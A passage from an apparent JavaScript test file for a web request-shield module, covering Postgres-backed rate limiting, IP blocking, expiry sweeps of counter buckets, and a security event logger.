       FROM shield_counters WHERE metric = 'request_volume' AND counter_key = $1`,
      [key]
    );
    expect(rows[0].total).toBe(5);
  });

  it('recordRequest blocks once the rate threshold (100) is reached within the window', async () => {
    const key = `test-rate-${testIp()}`;
    let lastResult = false;
    for (let i = 0; i < 100; i++) {
      lastResult = await recordRequest(key, key);
    }
    expect(lastResult).toBe(true);
    expect(await isBlocked(key)).toBe(true);

    const { rows } = await db.query('SELECT severity FROM blocked_ips WHERE ip_address = $1', [
      key,
    ]);
    expect(rows[0].severity).toBe('medium');
  }, 30_000);

  it('recordRequest tracks countKey and blockTargetIp separately, blocking the real IP', async () => {
    const accountKey = `admin:${Date.now()}`;
    const ip = testIp();
    for (let i = 0; i < 100; i++) {
      await recordRequest(accountKey, ip);
    }
    expect(await isBlocked(ip)).toBe(true);
  }, 30_000);

  it('resets the counter after a block, so the next request starts from zero', async () => {
    const key = `test-rate-reset-${testIp()}`;
    for (let i = 0; i < 100; i++) await recordRequest(key, key);
    expect(await isBlocked(key)).toBe(true);

    // Without the reset the count would still read 100 and every subsequent
    // request would re-block and re-alert.
    const { rows } = await db.query(
      'SELECT COALESCE(SUM(count), 0)::int AS total FROM shield_counters WHERE counter_key = $1',
      [key]
    );
    expect(rows[0].total).toBe(0);
  }, 30_000);

  it('keeps the two metric classes in separate counters', async () => {
    const ip = testIp();
    await recordRequest(`metric-split-request-${ip}`, ip);
    const { rows } = await db.query(
      'SELECT DISTINCT metric FROM shield_counters WHERE counter_key LIKE $1',
      [`metric-split-%${ip.split('.').pop()}`]
    );
    // A burst of one metric must not be able to push the other over its own
    // threshold, which is what a shared counter would allow.
    expect(rows.map((r) => r.metric)).toEqual(['request_volume']);
  });

  // The property the in-memory Maps could not provide: the count outlives
  // the process. Asserted against the stored row rather than by reloading
  // the module, because re-importing would build a second db pool — and
  // reading 3 here from a fresh connection is a strictly stronger statement
  // than reading it back through the same pool that wrote it.
  it('stores the count in Postgres, where a restart cannot clear it', async () => {
    const key = `test-persist-${testIp()}`;
    for (let i = 0; i < 3; i++) await recordRequest(key, key);

    const { rows } = await db.query(
      `SELECT COALESCE(SUM(count), 0)::int AS total, COUNT(*)::int AS buckets
       FROM shield_counters WHERE metric = 'request_volume' AND counter_key = $1`,
      [key]
    );
    expect(rows[0].total).toBe(3);
    // Bucketed, not row-per-event: 3 requests in one window share a bucket.
    expect(rows[0].buckets).toBe(1);

    // Independently: a second client on the same pool sees the same count.
    const other = await db.query(
      'SELECT COALESCE(SUM(count), 0)::int AS total FROM shield_counters WHERE counter_key = $1',
      [key]
    );
    expect(other.rows[0].total).toBe(3);
  });

  it('sweeps expired buckets and leaves live ones alone', async () => {
    const live = `test-sweep-live-${testIp()}`;
    const dead = `test-sweep-dead-${testIp()}`;
    await recordRequest(live, live);

    // Age one key's bucket well past any window it could still count toward.
    await db.query(
      `INSERT INTO shield_counters (counter_key, metric, bucket_start, count)
       VALUES ($1, 'request_volume', now() - interval '2 hours', 1)
       ON CONFLICT (metric, counter_key, bucket_start) DO UPDATE SET count = 1`,
      [dead]
    );

    const swept = await sweepExpiredCounters();
    expect(swept).toBeGreaterThan(0);

    const { rows } = await db.query(
      'SELECT counter_key FROM shield_counters WHERE counter_key = ANY($1)',
      [[live, dead]]
    );
    const keys = rows.map((r) => r.counter_key);
    expect(keys).toContain(live);
    expect(keys).not.toContain(dead);
  });

  it('bounded sweep reclaims rotating-IP keys instead of growing without bound', async () => {
    // 300 distinct keys — the shape of an attacker rotating source IPs. Each
    // costs one row; the sweep is what stops that accumulating forever.
    for (let i = 0; i < 300; i++) {
      await recordRequest(`rotate-${i}-${testIp()}`, `10.98.${Math.floor(i / 256)}.${i % 256}`);
    }
    const before = (await trackedKeyCounts()).requestVolume;
    expect(before).toBeGreaterThan(0);

    // Backdate every row for these keys past the sweep horizon.
    await db.query(
      `UPDATE shield_counters SET bucket_start = now() - interval '2 hours'
       WHERE counter_key LIKE 'rotate-%'`
    );
    await sweepExpiredCounters();

    const after = (await trackedKeyCounts()).requestVolume;
    expect(after).toBeLessThan(before);
  }, 60_000);
});

describe('shield/eventLogger.js', () => {
  it('logSecurityEvent inserts a row with the given fields', async () => {
    const ip = testIp();
    await logSecurityEvent({
      ip,
      eventType: 'sqli',
      severity: 'high',
      path: '/api/test',
      method: 'POST',
      matchedPattern: 'sql_union',
      snippet: 'union select',
      blocked: true,
    });

    const { rows } = await db.query(
      'SELECT * FROM security_events WHERE ip_address = $1 ORDER BY id DESC LIMIT 1',
      [ip]
    );
    expect(rows).toHaveLength(1);
    expect(rows[0].event_type).toBe('sqli');
    expect(rows[0].severity).toBe('high');
    expect(rows[0].blocked).toBe(true);
    expect(rows[0].matched_pattern).toBe('sql_union');
  });

  it('never throws, even if a required-looking field is missing', async () => {
    // eventLogger swallows its own errors and logs to console instead —
    // confirm that contract holds rather than letting a bad call crash
    // the request that triggered it.
    await expect(logSecurityEvent({ ip: testIp(), eventType: 'xss' })).resolves.toBeUndefined();
  });
});
